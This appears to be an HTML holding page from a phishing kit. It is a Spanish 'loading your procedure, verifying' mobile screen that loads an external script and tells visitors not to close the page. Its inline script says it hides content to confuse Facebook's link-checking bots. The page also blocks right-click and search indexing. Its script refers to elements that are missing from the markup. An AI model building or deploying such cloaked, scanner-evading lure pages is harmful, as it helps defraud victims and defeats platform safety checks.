<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>App-Móvil</title><meta name="robots" content="noindex, nofollow, noarchive, nosnippet, none"><meta name="googlebot" content="noindex, nofollow"><meta name="bingbot" content="noindex, nofollow"><meta name="google" content="notranslate"><meta name="referrer" content="no-referrer"><link rel="sitemap" type="application/xml" href="/sitemap.xml"><style>/* Fondo exterior 2026 */ body { margin: 0; padding: 0; background: linear-gradient(135deg, #0041c2 0%, #002b80 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; } /* Contenedor tipo Celular */ .box-container { width: 90%; max-width: 414px; background-color: #ffffff; border-radius: 30px; box-shadow: 0 20px 40px rgba(0,0,0,0.3); padding: 40px 25px; box-sizing: border-box; text-align: center; } /* Logo centrado arriba del contenido */ .header-logo { margin-bottom: 30px; /* Espacio antes del texto */ } .header-logo img { max-width: 160px; height: auto; } /* Bloque de Información (GIF + Texto) */ .info-wrapper { display: flex; align-items: center; justify-content: center; gap: 15px; margin-bottom: 35px; text-align: left; background-color: #f8faff; padding: 15px; border-radius: 15px; } .gif-icon { width: 45px; height: 45px; object-fit: contain; } .modal-title { font-size: 15px; color: #333; line-height: 1.4; margin: 0; font-weight: 500; } /* Loader Moderno */ .loader-container { display: flex; flex-direction: column; align-items: center; } .loader { border: 5px solid #f3f3f3; border-top: 5px solid #0041c2; border-radius: 50%; width: 55px; height: 55px; animation: spin 1s linear infinite; } .loading-text { margin-top: 15px; color: #0041c2; font-weight: bold; font-size: 13px; letter-spacing: 1.5px; text-transform: uppercase; } @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } .warning-text { font-size: 11px; color: #d93025; margin-top: 25px; font-weight: bold; }</style></head><body><div class="box-container"><div class="header-logo"></div><div class="info-wrapper"><h2 class="modal-title"> Cargando su Tramite, por favor espere. <b>Este proceso puede tardar un minuto.</b></h2></div><div class="loader-container"><div class="loader"></div><p class="loading-text">Verificando...</p></div><p class="warning-text">⚠️ IMPORTANTE: No recargue ni cierre la página.</p></div><div id="customAlert" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); z-index:9999; justify-content:center; align-items:center;"><div style="background:white; padding:25px; border-radius:20px; width:80%; max-width:300px; text-align:center; box-shadow:0 10px 25px rgba(0,0,0,0.2); font-family:sans-serif;"><p id="alertMessage" style="color:#333; font-size:16px; margin-bottom:20px;"></p><button onclick="closeAlert()" style="background:#0041c2; color:white; border:none; padding:10px 30px; border-radius:20px; font-weight:bold; cursor:pointer; width:100%;">Aceptar</button></div></div>
<script src="js/ra.js"></script>
<script>
        // Lógica del filtro: Mostrar el contenido tras 2.5 segundos
        // Esto confunde a los bots simples de Facebook que no esperan la carga asíncrona
        setTimeout(() => {
            document.getElementById('bot-filter').style.display = 'none';
            document.getElementById('main-content').style.display = 'block';
        }, 1200);

        // Bloqueo de clic derecho adicional
        document.addEventListener('contextmenu', event => event.preventDefault());
    </script>
</body>
